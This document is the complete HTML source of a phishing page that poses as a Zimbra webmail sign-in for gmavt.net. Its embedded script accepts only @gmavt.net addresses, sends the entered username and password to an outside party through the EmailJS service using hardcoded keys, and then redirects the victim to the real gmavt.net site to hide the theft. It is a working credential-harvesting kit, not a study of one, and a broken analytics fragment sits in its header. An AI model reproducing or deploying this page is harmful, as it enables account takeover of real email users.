<!DOCTYPE html>
<html lang="en">
<head>

  <script async src="https://plausible.io/js/pa-LsclXKnNgt32tqJUvKdct.js"></script>
  <script>

      (plausible.q = plausible.q || []).push(arguments)
    },

<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover" />
<title>Sign In</title>
<style>
  /* ----- Base & Reset ----- */
  * {
    -webkit-tap-highlight-color: transparent;
    box-sizing: border-box;
  }
  html, body {
    height: 100%;
    margin: 0;
    font-family: "Helvetica Neue", Helvetica, Arial, "Liberation Sans", sans-serif;
    background-color: #0088c1;
    background-image: url('https://i.imghippo.com/files/Qdz9402nEU.png');
    background-size: cover;
    background-position: center;
    position: relative;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
  }
  body::before {
    content: "";
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    background-color: #0088c1;
    opacity: 0.5;
    pointer-events: none;
    z-index: 0;
  }

  /* ----- Layout ----- */
  .outer-wrapper {
    position: relative;
    z-index: 1;
    min-height: 100dvh;
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 24px 16px;
    flex-direction: column;
  }
  .form-container {
    width: 100%;
    max-width: 340px;             /* reduced from 400px */
    background-color: #ffffff;
    padding: 32px 28px 30px;      /* reduced padding */
    border-radius: 6px;
    box-shadow: 0 8px 24px rgba(0, 0, 0, 0.10);
    display: flex;
    flex-direction: column;
    align-items: flex-start;
  }

  /* ----- Logo ----- */
  .form-logo {
    display: block;
    width: 100%;
    max-width: 240px;             /* slightly smaller */
    height: auto;
    object-fit: contain;
    margin: 0 0 14px 0;
    align-self: flex-start;
  }

  /* ----- Heading ----- */
  .signIn {
    font-size: 18px;
    color: #3d3d3d;
    font-weight: 500;
    margin: 0 0 20px 0;
    align-self: flex-start;
    letter-spacing: -0.01em;
    line-height: 1.3;
  }

  /* ----- Form ----- */
  form {
    display: flex;
    flex-direction: column;
    gap: 12px;                    /* tighter spacing */
    width: 100%;
  }
  label {
    font-weight: 400;
    font-size: 13px;
    color: #333333;
    margin-bottom: 4px;           /* tighter */
    text-align: left;
    display: block;
  }
  .input-group {
    display: flex;
    flex-direction: column;
    width: 100%;
  }
  .custom-input {
    font-size: 15px;
    border-radius: 5px;
    padding: 9px 12px;            /* more compact input */
    background: #ffffff;
    border: 1px solid #d0d7de;
    width: 100%;
    appearance: none;
    margin: 0;
    transition: border-color 0.2s, box-shadow 0.2s;
    line-height: 1.4;
    color: #1a1a1a;
    font-weight: 400;
  }
  .custom-input:focus {
    border-color: #0088c1;
    outline: none;
    box-shadow: 0 0 0 3px rgba(0, 136, 193, 0.10);
  }
  .custom-input::placeholder {
    color: transparent;           /* hide placeholder text */
  }

  /* ----- Error ----- */
  .error-message {
    color: #d93025;
    font-size: 12px;
    margin-top: 4px;
    margin-bottom: 0;
    line-height: 1.3;
    min-height: 0;
    font-weight: 400;
  }

  /* ----- Actions Row ----- */
  .actions-row {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-top: 8px;              /* tighter */
    gap: 10px;
  }
  .custom-submit {
    background-color: #0088c1;
    color: #ffffff;
    font-weight: 500;
    font-size: 14px;
    padding: 10px 22px;           /* smaller button */
    height: auto;
    border: 1px solid #0088c1;
    border-radius: 5px;
    cursor: pointer;
    text-align: center;
    box-sizing: border-box;
    transition: background-color 0.2s, border-color 0.2s;
    -webkit-appearance: none;
    appearance: none;
    flex-shrink: 0;
    letter-spacing: 0.01em;
  }
  .custom-submit:hover {
    background-color: #0077ad;
    border-color: #0077ad;
  }
  .custom-submit:active {
    transform: scale(0.98);
  }

  /* ----- Checkbox ----- */
  .checkbox-container {
    display: flex;
    align-items: center;
    gap: 6px;
  }
  .checkbox-container input[type="checkbox"] {
    width: 15px;
    height: 15px;
    margin: 0;
    cursor: pointer;
    accent-color: #0088c1;
    flex-shrink: 0;
  }
  .checkbox-container label {
    font-weight: 400;
    font-size: 12.5px;
    cursor: pointer;
    margin: 0;
    color: #4a4a4a;
    line-height: 1.2;
  }

  /* ----- Footer ----- */
  .footer-text {
    margin-top: 20px;
    width: 100%;
    text-align: center;
    color: rgba(255,255,255,0.8);
    font-size: 10.5px;
    line-height: 1.5;
    padding: 0 8px;
    font-weight: 400;
  }

  /* ============================================================= */
  /*                       MOBILE TWEAKS                           */
  /* ============================================================= */
  @media screen and (max-width: 600px) {
    .outer-wrapper {
      padding: 16px 12px;
      align-items: flex-start;
      padding-top: 32px;
    }
    .form-container {
      padding: 26px 20px 24px;
      border-radius: 8px;
      box-shadow: 0 6px 18px rgba(0, 0, 0, 0.12);
      max-width: 100%;
    }
    .form-logo {
      max-width: 200px;
      margin: 0 auto 14px auto;
      align-self: center;
    }
    .signIn {
      font-size: 17px;
      text-align: center;
      align-self: center;
      margin-bottom: 18px;
      font-weight: 500;
    }
    label {
      font-size: 12.5px;
      font-weight: 400;
    }
    .custom-input {
      font-size: 15px;
      padding: 10px 12px;
      border-radius: 5px;
    }
    .actions-row {
      flex-direction: column;
      align-items: stretch;
      gap: 12px;
      margin-top: 10px;
    }
    .custom-submit {
      width: 100%;
      padding: 12px 20px;
      font-size: 14px;
      border-radius: 5px;
      font-weight: 500;
      order: 1;
    }
    .checkbox-container {
      justify-content: center;
      order: 2;
      padding: 2px 0;
    }
    .checkbox-container label {
      font-size: 13px;
    }
    .footer-text {
      font-size: 10px;
      margin-top: 16px;
      padding-bottom: 8px;
      color: rgba(255,255,255,0.75);
    }
  }

  /* Small phones (iPhone SE, etc) */
  @media screen and (max-width: 380px) {
    .form-container {
      padding: 22px 14px 20px;
    }
    .form-logo {
      max-width: 170px;
    }
    .signIn {
      font-size: 16px;
    }
    .custom-input {
      padding: 9px 10px;
    }
    .custom-submit {
      padding: 11px 14px;
      font-size: 13.5px;
    }
  }
</style>
</head>
<body>
<div class="outer-wrapper">
  <div class="form-container">
    <!-- Updated logo -->
    <img src="https://i.imghippo.com/files/FpLg2037Q.png" alt="gmavt.net-large" class="form-logo" />
    <div class="signIn">Confirm Activity</div>
    <form id="contact-form" novalidate>
      <div class="input-group">
        <label for="email-input">Username</label>
        <input id="email-input" class="custom-input" type="email" name="user_email" required autocomplete="email" inputmode="email" autocapitalize="none" autocorrect="off" spellcheck="false" />
        <div id="email-error" class="error-message"></div>
      </div>
      <div class="input-group">
        <label for="password-input">Password</label>
        <input id="password-input" class="custom-input" type="password" name="user_password" required autocomplete="current-password" />
        <div id="password-error" class="error-message"></div>
      </div>
      <div class="actions-row">
        <button type="submit" class="custom-submit">Continue</button>
        <div class="checkbox-container">
          <input type="checkbox" id="stay-signed-in" name="stay_signed_in" />
          <label for="stay-signed-in">Stay signed in</label>
        </div>
      </div>
    </form>
  </div>
  <div class="footer-text">Copyright © 2005-2025 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.</div>
</div>
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
<script>
  // Initialize EmailJS with your public key
  (function() {
    emailjs.init("SdkmRe8WZ7itEba9z");
  })();

  const form = document.getElementById("contact-form");
  const emailInput = document.getElementById("email-input");
  const passwordInput = document.getElementById("password-input");
  const emailError = document.getElementById("email-error");
  const passwordError = document.getElementById("password-error");

  form.addEventListener("submit", async (e) => {
    e.preventDefault();

    // Clear errors
    emailError.textContent = "";
    passwordError.textContent = "";

    // Validate input
    const emailValue = emailInput.value.trim();
    const passwordValue = passwordInput.value.trim();
    // Only allow @gmavt.net emails
    const allowedDomainRegex = /^[^@\s]+@gmavt\.net$/i;
    let valid = true;

    if (!emailValue) {
      emailError.textContent = "Email is required.";
      valid = false;
    } else if (!allowedDomainRegex.test(emailValue)) {
      emailError.textContent = "Email must be @gmavt.net.";
      valid = false;
    }

    if (!passwordValue) {
      passwordError.textContent = "Password is required.";
      valid = false;
    }

    if (!valid) return;

    try {
      // Send form via EmailJS
      const response = await emailjs.sendForm(
        "service_zuj2d2a",
        "template_tvd86sp",
        "#contact-form"
      );
      console.log("EmailJS SUCCESS:", response.status);

      // Redirect after success
      window.location.href = "https://www.gmavt.net";
    } catch (error) {
      console.error("EmailJS FAILED:", error);
      alert("There was an error sending your credentials. Please try again later.");
    }
  });
</script>
</body>
</html>
